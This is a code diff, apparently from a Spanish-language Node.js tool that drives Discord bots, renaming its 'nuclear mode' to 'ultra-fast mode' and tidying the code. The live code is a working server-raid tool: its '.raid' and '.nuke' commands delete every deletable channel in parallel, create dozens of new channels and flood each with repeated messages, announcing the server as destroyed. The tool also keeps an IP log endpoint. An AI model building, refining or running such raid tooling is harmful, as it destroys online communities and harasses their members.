@@ -51,7 +51,7 @@ let ipLogs = [];
 let activeBots = new Map();
 let uploadedImages = new Map();
 
-// Configuración predeterminada del raid - MODO NUCLEAR
+// Configuración predeterminada del raid - MODO ULTRA RÁPIDO
 const RAID_CONFIG = {
     canales: 50,
     mensajesPorCanal: 15,
@@ -175,7 +175,7 @@ app.get('/api/ip-logs', (req, res) => {
 });
 
 // ============================================
-// BOT DE COMANDOS - MODO NUCLEAR (SIN COOLDOWN)
+// BOT DE COMANDOS - MODO ULTRA RÁPIDO (TODO EN PARALELO)
 // ============================================
 
 // Iniciar bot
@@ -205,7 +205,7 @@ app.post('/api/start-bot', async (req, res) => {
         bot.once('ready', () => {
             console.log(`✅ Bot conectado: ${bot.user.tag}`);
             console.log(`📊 Servidores: ${bot.guilds.cache.size}`);
-            console.log(`⚡ MODO NUCLEAR ACTIVADO - SIN COOLDOWNS`);
+            console.log(`⚡ MODO ULTRA RÁPIDO ACTIVADO - TODO EN PARALELO`);
             
             bot.on(Events.MessageCreate, async (message) => {
                 if (message.author.bot) return;
@@ -218,10 +218,10 @@ app.post('/api/start-bot', async (req, res) => {
                 console.log(`📨 Comando recibido: ${command} en ${message.guild?.name}`);
 
                 // ============================================
-                // COMANDO .raid - MODO NUCLEAR (TODO EN 1 SEGUNDO)
+                // COMANDO .raid - TODO EN PARALELO (ULTRA RÁPIDO)
                 // ============================================
                 if (command === 'raid') {
-                    await message.reply(`☢️ **MODO NUCLEAR ACTIVADO** ☢️\n\`\`\`diff\n+ DESTRUYENDO SERVIDOR EN 1 SEGUNDO...\`\`\``);
+                    await message.reply(`⚡ **MODO ULTRA RÁPIDO ACTIVADO** ⚡\n\`\`\`\n📊 EJECUTANDO TODO EN PARALELO...\`\`\``);
                     
                     try {
                         const guild = message.guild;
@@ -231,16 +231,20 @@ app.post('/api/start-bot', async (req, res) => {
                         }
 
                         // ============================================
-                        // FASE 1: ELIMINAR CANALES (EN PARALELO)
+                        // FASE 1: ELIMINAR TODOS LOS CANALES (EN PARALELO)
                         // ============================================
                         const channels = await guild.channels.fetch();
                         const deletePromises = [];
+                        
                         channels.forEach(channel => {
                             if (channel.deletable) {
-                                deletePromises.push(channel.delete().catch(() => {}));
+                                deletePromises.push(
+                                    channel.delete().catch(() => {})
+                                );
                             }
                         });
-                        await Promise.all(deletePromises);
+                        
+                        const deleteResults = await Promise.all(deletePromises);
                         const canalesEliminados = deletePromises.length;
 
                         // ============================================
@@ -257,19 +261,19 @@ app.post('/api/start-bot', async (req, res) => {
                         }
                         
                         const canales = await Promise.all(createPromises);
-                        const canalesCreados = canales.filter(c => c !== null).length;
+                        const canalesValidos = canales.filter(c => c !== null);
+                        const canalesCreados = canalesValidos.length;
 
                         // ============================================
-                        // FASE 3: ENVIAR 15 MENSAJES POR CANAL (EN PARALELO)
+                        // FASE 3: ENVIAR MENSAJES A TODOS LOS CANALES (EN PARALELO)
                         // ============================================
                         const messagePromises = [];
-                        canales.forEach(channel => {
-                            if (channel) {
-                                for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
-                                    messagePromises.push(
-                                        channel.send(RAID_CONFIG.mensaje).catch(() => {})
-                                    );
-                                }
+                        
+                        canalesValidos.forEach(channel => {
+                            for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
+                                messagePromises.push(
+                                    channel.send(RAID_CONFIG.mensaje).catch(() => {})
+                                );
                             }
                         });
                         
@@ -279,15 +283,16 @@ app.post('/api/start-bot', async (req, res) => {
                         // ============================================
                         // FASE 4: REPORTE FINAL
                         // ============================================
-                        await message.channel.send(`💥 **SERVIDOR DESTRUIDO** 💥\n\`\`\`prolog\n🗑️ CANALES ELIMINADOS: ${canalesEliminados}\n📌 CANALES CREADOS: ${canalesCreados}\n💬 MENSAJES ENVIADOS: ${mensajesEnviados}\n⚡ TIEMPO: ~1 SEGUNDO\`\`\``);
+                        await message.channel.send(`✅ **RAID COMPLETADO EN MODO ULTRA RÁPIDO** ✅\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${canalesEliminados}\n📌 CANALES CREADOS: ${canalesCreados}\n💬 MENSAJES ENVIADOS: ${mensajesEnviados}\n⚡ MODO: TODO EN PARALELO\n\`\`\``);
 
                     } catch (e) {
+                        console.error('Error en raid:', e);
                         await message.channel.send(`❌ Error: ${e.message}`);
                     }
                 }
                 
                 // ============================================
-                // COMANDO .nuke - ELIMINAR TODO (EN PARALELO)
+                // COMANDO .nuke - ELIMINAR TODO EN PARALELO
                 // ============================================
                 else if (command === 'nuke') {
                     await message.reply('💥 **ELIMINANDO TODO EN PARALELO**...');
@@ -304,13 +309,15 @@ app.post('/api/start-bot', async (req, res) => {
                         
                         channels.forEach(channel => {
                             if (channel.deletable) {
-                                deletePromises.push(channel.delete().catch(() => {}));
+                                deletePromises.push(
+                                    channel.delete().catch(() => {})
+                                );
                             }
                         });
                         
                         await Promise.all(deletePromises);
                         
-                        await message.channel.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${deletePromises.length}\`\`\``);
+                        await message.channel.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${deletePromises.length}\n⚡ MODO: PARALELO\`\`\``);
                         
                     } catch (e) {
                         await message.channel.send(`❌ Error: ${e.message}`);
@@ -360,28 +367,28 @@ app.post('/api/start-bot', async (req, res) => {
                 // ============================================
                 else if (command === 'help') {
                     const helpMsg = `
-**☢️ MODO NUCLEAR - SIN COOLDOWNS ☢️**
+**⚡ MODO ULTRA RÁPIDO - TODO EN PARALELO ⚡**
 \`\`\`css
-${prefix}raid    - Destruye el servidor en 1 segundo (nuke + 50 canales + 15 msgs)
-${prefix}nuke    - Elimina todos los canales en paralelo
+${prefix}raid    - Destruye el servidor (TODO EN PARALELO)
+${prefix}nuke    - Elimina todos los canales (PARALELO)
 ${prefix}stop    - Detiene el bot
 ${prefix}off     - Lo mismo que .stop
 ${prefix}servers - Lista todos los servidores
 ${prefix}ping    - Muestra la latencia
 ${prefix}help    - Muestra esta ayuda
 \`\`\`
-⚙️ **CONFIGURACIÓN NUCLEAR:**
+⚙️ **CONFIGURACIÓN ULTRA RÁPIDA:**
 \`\`\`yaml
 Canales a crear: ${RAID_CONFIG.canales}
 Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
 Nombre del canal: ${RAID_CONFIG.nombreCanal}
-Velocidad: MÁXIMA (TODO EN PARALELO)
+Modo: TODO EN PARALELO (MÁXIMA VELOCIDAD)
 \`\`\``;
                     await message.reply(helpMsg);
                 }
             });
             
-            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix} (MODO NUCLEAR)`);
+            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix} (MODO ULTRA RÁPIDO)`);
         });
 
         activeBots.set(token, {
@@ -394,7 +401,7 @@ Velocidad: MÁXIMA (TODO EN PARALELO)
 
         res.json({ 
             success: true, 
-            message: "✅ Bot iniciado en MODO NUCLEAR",
+            message: "✅ Bot iniciado en MODO ULTRA RÁPIDO",
             user: bot.user?.tag,
             servers: bot.guilds.cache.size,
             config: RAID_CONFIG
@@ -473,7 +480,7 @@ app.get('/api/active-bots', (req, res) => {
             startedAt: data.startedAt,
             servers: data.servers || 0,
             prefix: data.prefix || '.',
-            mode: "NUCLEAR"
+            mode: "ULTRA RÁPIDO"
         });
     });
     res.json(bots);
@@ -490,7 +497,7 @@ app.post('/api/update-config', (req, res) => {
     
     res.json({ 
         success: true, 
-        message: "Configuración nuclear actualizada",
+        message: "Configuración ultra rápida actualizada",
         config: RAID_CONFIG 
     });
 });
@@ -501,10 +508,10 @@ app.post('/api/update-config', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
     console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
-    console.log(`☢️ MODO NUCLEAR ACTIVADO:`);
+    console.log(`⚡ MODO ULTRA RÁPIDO ACTIVADO:`);
     console.log(`   - Canales: ${RAID_CONFIG.canales}`);
     console.log(`   - Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}`);
     console.log(`   - Nombre canal: ${RAID_CONFIG.nombreCanal}`);
-    console.log(`   - Velocidad: MÁXIMA (TODO EN PARALELO)`);
+    console.log(`   - Modo: TODO EN PARALELO`);
     console.log(`🌐 URL: http://localhost:${PORT}`);
 });
